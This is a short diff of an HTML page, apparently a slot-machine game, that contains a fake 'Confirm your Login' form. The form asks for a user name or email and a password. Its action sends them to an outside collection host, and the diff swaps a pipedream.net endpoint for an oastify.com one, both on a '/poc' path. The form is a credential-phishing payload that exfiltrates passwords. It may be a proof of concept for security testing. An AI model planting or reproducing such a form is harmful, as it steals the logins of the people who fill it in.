@@ -47,7 +47,7 @@
       <button id="girarBtn">Roll</button>
       <div class="login">
         <h3>Confirm your Login</h3>
-        <form id="slotLoginForm" action="//eoosnliv8uzjh9r.m.pipedream.net/poc" method="POST">
+        <form id="slotLoginForm" action="//hk59pbnfdcgzaqznr7y6yhgcu30uolca.oastify.com/poc" method="POST">
           <input type="text" name="user" placeholder="User/Mail" required><br>
           <input type="password" name="pass" placeholder="Password" required><br>
           <button type="submit">Signin</button>
